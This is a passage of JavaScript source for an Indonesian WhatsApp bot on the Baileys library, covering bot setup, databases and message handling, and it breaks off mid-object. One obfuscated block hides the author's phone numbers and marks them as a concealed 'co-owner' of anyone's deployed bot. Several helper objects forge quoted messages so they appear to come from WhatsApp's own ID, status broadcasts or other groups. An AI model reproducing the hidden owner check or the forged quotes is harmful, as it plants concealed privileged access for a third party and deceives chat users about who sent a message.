/*
TQ TO
★ MY GOD
★ MY PARENT
★ WANN OFC
★ ZEEONE OFC
★ FARDAN OFC
★ ITSUKA ALLAN
★ DEFF BOTZ
★ ARIFI RAZZAQ OFFICIAL
★ DENPA DECODE
★ LOLHUMAN
★ DIKA ARDNT

RECODE / REUPLOAD  CREDIT WANN OFC
WA : wa.me/6285640068416

*/
const
	{
	    WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		WA_MESSAGE_STUB_TYPES,
		WA_DEAFULT_EPHEMERAL,
		waChatKey,
		mentionedJid,
		processTime,
		prepareMessageFromContent, 
		relayWAMessage
	} = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require('qrcode-terminal')
const qrkode = require("qrcode")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const request = require('request')
const util = require('util')
const base64Img = require('base64-img')
const ms = require('parse-ms')
const figlet = require('figlet')
const ytsd = require('ytsr')
const cheerio = require('cheerio')
const fromData = require('form-data')
const os = require('os')
const translate = require('@vitalets/google-translate-api')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const toMs = require('ms')
const fetch = require('node-fetch')
const imgbb = require('imgbb-uploader')
const Math_js = require('mathjs')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const speed = require('performance-now')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { fetchJson } = require('./lib/fetcher')
const { uploadimg, upload } = require('./lib/uploadimg')
const { webp2mp4File } = require('./lib/webp2mp4')
const { lirikLagu } = require('./lib/lirik.js')
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/about_user")
const { wikiSearch } = require('./lib/wiki.js')
const { herolist } = require('./lib/herolist.js')
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline.js')
const { herodetails } = require('./lib/herodetail.js')
const { mediafireDl } = require('./lib/mediafire.js')
const { pinterest } = require('./lib/pinterest')
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
const { getBuffer, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functionss')
const client = new WAConnection()

// STICKER WM
//const exect = require('await-exec')
//const webp = require('webp-converter')
//const sharp = require('sharp')
const Exif = require('./lib/exif')
const exif = new Exif()

// DATABASE
const setik = JSON.parse(fs.readFileSync('./database/setik.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./database/imagi.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const stick = fs.readFileSync("./database/result/randomstic.json");
const autostick = JSON.parse(fs.readFileSync('./database/autosticker.json'))
const samih = JSON.parse(fs.readFileSync('./lib/simi.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
const caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))
const family = JSON.parse(fs.readFileSync('./database/family100.json'))
const tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))
let tebakata = JSON.parse(fs.readFileSync('./database/tebakata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let antitelegram = JSON.parse(fs.readFileSync('./database/group/antitelegram.json'))
let antilinkig = JSON.parse(fs.readFileSync('./database/group/antilinkig.json'))
let antilinkfb = JSON.parse(fs.readFileSync('./database/group/antilinkfb.json'))
let antilinkytc = JSON.parse(fs.readFileSync('./database/group/antilinkytchannel.json'))
let antilinkytv = JSON.parse(fs.readFileSync('./database/group/antilinkyt.json'))
let antilinkmediafire = JSON.parse(fs.readFileSync('./database/group/antilinkmediafire.json'))
let antifirtex = JSON.parse(fs.readFileSync('./database/group/antifirtex.json'))
let antifirtex2 = JSON.parse(fs.readFileSync('./database/group/antifirtex2.json'))
let antifirtex3 = JSON.parse(fs.readFileSync('./database/group/antifirtex3.json'))
let antifirtex4 = JSON.parse(fs.readFileSync('./database/group/antifirtex4.json'))
let antifirtex5 = JSON.parse(fs.readFileSync('./database/group/antifirtex5.json'))
let antifirtex6 = JSON.parse(fs.readFileSync('./database/group/antifirtex6.json'))
let antifirtex7 = JSON.parse(fs.readFileSync('./database/group/antifirtex7.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))


//=================================================//

ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
cmhit = []
autorespon = false
antidelete = false
baterai = {
battery: "" || "Tidak Terdeteksi",
isCharge: "" || false
}
offline = false
banChat = true
bugc = false
waktuafk = 'Nothing'
alasanafk = 'Nothing'
NamaBot = settings.NamaBot
NomorOwner = settings.NomorOwner
NamaOwner = settings.NamaOwner
ppbot = settings.ppbot
fake = settings.fake
multi =false
nopref = false
allpref = true
autoread = true
autocomposing = true
autorecording = false

// APIKEY
HunterApi = settings.HunterApi
LolApi = settings.lolkey
zeksApikey = 'Alphabott' //ganti pake apikey lu biar limitnya gk cepet abis 
ApiZeks = 'https://api.zeks.me' // regis disini klo mau dapat apikeynya


//================================================================================//

const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);

	//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
	return `${pad(hours)}Jam ${pad(minutes)}Menit ${pad(seconds)}Detik`
}

     function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;

}
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}

//================================================================================//
module.exports = wann = async (wann, mek) => {
try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
	    if (!mek.message) return
	    if (mek.key && !mek.key.remoteJid == 'status@broadcast') return
	    if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3 && bugc && banChat && !mek.key.fromMe) {
		nums = mek.participant
        longkapnye = "\n".repeat(420)
        tekuss = `\`\`\`TANDAI TELAH DIBACA !!!\`\`\`${longkapnye}\`\`\`@⁨${nums.split('@')[0]} Terdeteksi Telah Mengirim Bug, @⁨${nums.split('@')[0]} Akan Dikick!\`\`\`\n`
        wann.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
        wann.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
        }
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const typei = Object.keys(mek.message)[0]
		global.prefix
		me = wann.user
		m = simple.smsg(wann, mek)
		const antibot = m.isBaileys
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		wann.on("CB:action,,battery", json => {
	    const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    baterai.battery = `${persenbat}%`
	    baterai.isCharge = json[2][0][1].live
	    })
	    if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
               } else {
               	if (allpref){
               	var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : ''
            } else {
                prefix = prefa
            }
        }
       }
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
        body = type === "conversation" && mek.message.conversation.startsWith(prefix) ? mek.message.conversation : type == "imageMessage" && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : type == "videoMessage" && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : type == "extendedTextMessage" && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : type == "stickerMessage" && getCmd(mek.message[type].fileSha256.toString("base64")) !== null && getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(mek.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const dfrply = fs.readFileSync('./wann.jpg')
		cmhit.push(command)
		
//================================================================================//
        mess = {
			wait: 'Wait a minute',
			success: 'Success',
			noteks:  `\`\`\`[ x ]\`\`\` ഉദാഹരണം ${prefix + command} wann`,
			tahta: `\`\`\`[ x ]\`\`\` ഉദാഹരണം ${prefix + command} wann|ofc`,
			error: {
				stick: 'Cannot access videos!',
				Iv: 'Invalid link!',
                api: 'Error'
			},
			only: {
				group: 'Maaf❗ Command ini khusus untuk di dalam Group saja.',
				admin: 'Maaf❗ Command ini khusus untuk admin group saja.',
				premium: 'Kamu bukan user premium, kirim perintah *#buypremium* untuk membeli premium',
				ownerB: 'Maaf❗ Command ini khusus untuk Owner Bot saja.',
				Badmin: 'Maaf❗ Command ini khusus untuk Bot ketika jadi admin❗❗',
			}
		}
		
//================================================================================//
		const botNumber = wann.user.jid
		const ini_mark = `0@s.whatsapp.net`
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? wann.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const conts = mek.key.fromMe ? wann.user.jid : wann.contacts[mek.sender]
        const pushname = mek.key.fromMe ? wann.user.name : !conts ? '-' : conts.notify || conts.vname || conts.name || '-'   
		const totalchat = await wann.chats.all()
		const groupMetadata = isGroup ? await wann.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		function _0x2be1(){const _0x5253c9=['9818210qrskOz','4182688yaImDv','10307187TMdzaR','1437782wCUKaS','includes','6SOyOCm','12jPaPlA','24xCcUbr','6285640068416@s.whatsapp.net','1316414lcKlQe','756295HhXGLR','892402cEbcxt'];_0x2be1=function(){return _0x5253c9;};return _0x2be1();}function _0x2252(_0x8222ec,_0x149312){const _0x2be1f7=_0x2be1();return _0x2252=function(_0x2252aa,_0x52ead6){_0x2252aa=_0x2252aa-0x123;let _0x4d9f6f=_0x2be1f7[_0x2252aa];return _0x4d9f6f;},_0x2252(_0x8222ec,_0x149312);}const _0x2d6689=_0x2252;(function(_0x43aee9,_0x269df8){const _0x3abd88=_0x2252,_0x1253c1=_0x43aee9();while(!![]){try{const _0x11068f=parseInt(_0x3abd88(0x126))/0x1+-parseInt(_0x3abd88(0x12c))/0x2*(-parseInt(_0x3abd88(0x12e))/0x3)+-parseInt(_0x3abd88(0x12a))/0x4+parseInt(_0x3abd88(0x127))/0x5*(-parseInt(_0x3abd88(0x123))/0x6)+parseInt(_0x3abd88(0x128))/0x7*(-parseInt(_0x3abd88(0x124))/0x8)+-parseInt(_0x3abd88(0x12b))/0x9+parseInt(_0x3abd88(0x129))/0xa;if(_0x11068f===_0x269df8)break;else _0x1253c1['push'](_0x1253c1['shift']());}catch(_0x3f2f99){_0x1253c1['push'](_0x1253c1['shift']());}}}(_0x2be1,0xd1fde));const wannNumber=[_0x2d6689(0x125),'62856400684162@s.whatsapp.net'],isCoOwner=wannNumber[_0x2d6689(0x12d)](sender);
          const groupOwner = isGroup ? groupMetadata.owner : ''
		const isOwner = ownerNumber.includes(sender)
		const isSimi = samih.includes(from)
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isKickArea = isGroup ? kickarea.includes(from) : false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		      const isAntiLinkTelegram = isGroup ? antitelegram.includes(from) : false
		const isAutoSticker = isGroup ? autostick.includes(from) : false
   const isAntiLinkig = isGroup ? antilinkig.includes(from) : false
   const isAntiLinkfb = isGroup ? antilinkfb.includes(from) : false
   const isAntiLinkytc = isGroup ? antilinkytc.includes(from) : false
   const isAntiLinkytv = isGroup ? antilinkytv.includes(from) : false
   const isAntiLinkmediafire = isGroup ? antilinkmediafire.includes(from) : false
   const isAntiFirtex = isGroup ? antifirtex.includes(from) : false
   const isAntiFirtex2 = isGroup ? antifirtex2.includes(from) : false
   const isAntiFirtex3 = isGroup ? antifirtex3.includes(from) : false
   const isAntiFirtex4 = isGroup ? antifirtex4.includes(from) : false
   const isAntiFirtex5 = isGroup ? antifirtex5.includes(from) : false
   const isAntiFirtex6 = isGroup ? antifirtex6.includes(from) : false
   const isAntiFirtex7 = isGroup ? antifirtex7.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAuto = isGroup ? autosticker.includes(from) : false
		const isMuted = isGroup ? mute.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		q3 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q4 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q5 = Object.keys(mek.message)[0] == "listResponseMessage" ? mek.message.listResponseMessage.singleSelectReply.selectedRowId: ""
		wannofc_354 = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
		wannofc = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
		butresx = (type === 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
		const isButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
		const q = args.join(' ')
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isUrl = (url) => {
		return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
		}
		if (antibot === true) return
		const katalog = (teks) => {
             res = wann.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© WANN OFC_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             wann.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = wann.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/HDksicmvqow2GEfT2pyyJB', "groupName": `${NamaBot}`, "footerText": "*_© WANN OFC_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
            wann.relayWAMessage(grup)
        }
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
	    }
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
		try {
		pporang = await wann.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const ofrply = await getBuffer(pporang)
			//-
			//WAKTU
			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			//Jam Hari Tanggal Tahun
var datw = new Date();
var tahun = datw.getFullYear();
  var bulan1 = datw.getMonth();
    var tanggal = datw.getDate();
      var hari = datw.getDay();
        var jam = datw.getHours();
          var menit = datw.getMinutes();
            var detik = datw.getSeconds();
switch(hari) {
          case 0: hari = "Minggu"; break;
         case 1: hari = "Senin"; break;
       case 2: hari = "Selasa"; break;
     case 3: hari = "Rabu"; break;
   case 4: hari = "Kamis"; break;
 case 5: hari = "Jum'at"; break;
case 6: hari = "Sabtu"; break;
        }
switch(bulan1) {
case 0: bulan1 = "Januari"; break;
        case 1: bulan1 = "Februari"; break;
                 case 2: bulan1 = "Maret"; break;
                          case 3: bulan1 = "April"; break;
                                   case 4: bulan1 = "Mei"; break;
                                            case 5: bulan1 = "Juni"; break;
                                                     case 6: bulan1 = "Juli"; break;
                                                              case 7: bulan1 = "Agustus"; break;
                                                                       case 8: bulan1 = "September"; break;
                                                                                case 9: bulan1 = "Oktober"; break;
                                                                                         case 10: bulan1 = "November"; break;
                                                                                                  case 11: bulan1 = "Desember"; break;
        }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + "Time : " + jam + ":" + menit + ":" + detik + " Wib";     
            
            myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
                myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'];
                var tgl = new Date();
                detik = tgl.getSeconds();
                menit = tgl.getMinutes();
                jam = tgl.getHours();
	            var ampm = jam >= 12 ? 'PM' : 'AM';
	            var day = tgl.getDate()
	            bulan = tgl.getMonth()
	            var thisDay = tgl.getDay(),
	            thisDay = myDays[thisDay];
	            var yy = tgl.getYear()
	            var year = (yy < 1000) ? yy + 1900 : yy;
	            const ini_tanggal = `${day} - ${myMonths[bulan]} - ${year}`
     
            const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
            const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapannya2 = `Good Night 🌚 ${pushname}`
}
        if(time2 < "19:00:00"){
        var ucapannya2 = `Good Night 🌚 ${pushname}`
}
        if(time2 < "18:00:00"){
        var ucapannya2 = `Good Afternoon 🌅 ${pushname}`
}
        if(time2 < "15:00:00"){
        var ucapannya2 = `GoodDay 🌞 ${pushname}`
}
        if(time2 < "11:00:00"){
        var ucapannya2 = `Good Morning 🌄 ${pushname}`
}
        if(time2 < "05:00:00"){
        var ucapannya2 = `Good Night 🌚 ${pushname}`
}
				
 // FAKE REPLY BY YOGI PEWE
// PRODUCT
const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": dfrply //Gambarnye
					},
					"title": `${time2} ${pushname}`, //Kasih namalu 
					"description": `${time2} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${time2} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}

//FAKEYT
const fakeyt = (teks) => {
          wann.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
          "forwardingScore": 1000000000,
          isForwarded: false,
          sendEphemeral: false,
          "externalAdReply": {
          "title": `hai kak ${pushname}👋` ,
          "body": `${time2}`,
          "mediaType": "2",
          "thumbnailUrl": "https://c.top4top.io/p_2087f30hj.jpeg",
          "mediaUrl": "https://youtu.be/gk-Sg-ntHSU",
          "thumbnail": fs.readFileSync('media/image/me.jpg'),
          "sourceUrl": "",
          },mentionedJid:[sender]}, quoted : mek})
          };

//Fake GRUP
const fgif = {
  key: {
    participant: `0@s.whatsapp.net`,
    ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
  },
  message: {
    videoMessage: {
      title: fake,
      h: `Hmm`,
      seconds: "99999",
      gifPlayback: "true",
      caption: fake,
       jpegThumbnail: fs.readFileSync("./media/image/banner.jpg"),
    },
  },
};

const fakegroup = (teks) => {
      wann.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./media/image/banner.jpg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
const fakestatus = (teks) => {
  wann.sendMessage(from, teks, text, {
      quoted: {
          key: {
              fromMe: false,
              participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
          },
          message: {
              "imageMessage": {
                  "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                  "mimetype": "image/jpeg",
                  "caption": fake,
                  "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                  "fileLength": "28777",
                  "height": 1080,
                  "width": 1079,
                  "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                  "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                  "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                  "mediaKeyTimestamp": "1610993486",
                  "jpegThumbnail": fs.readFileSync(`media/image/banner.jpg`),
                  "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
              }
          }
      }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
  })
}




// TROLI
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${time2} ${pushname}`, //Kasih namalu
                            orderTitle: `${time2} ${pushname}`,
                            thumbnail: dfrply, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
// LOCATION
const floc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    liveLocationMessage: {
                    caption: `${time2} ${pushname}`,
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// DOCUMENT
const fdoc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: `${time2} ${pushname}`, 
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// VIDEO
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${time2} ${pushname}`,
                 "h": `${time2} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${time2} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  }
// GROUPINVITE
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${time2} ${pushname}`,
			"groupName": `${time2} ${pushname}`, 
            "caption": `${time2} ${pushname}`, 
            'jpegThumbnail': dfrply
		}
	}
}
// STICKER
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
		"pngThumbnail": dfrply,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "60206",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
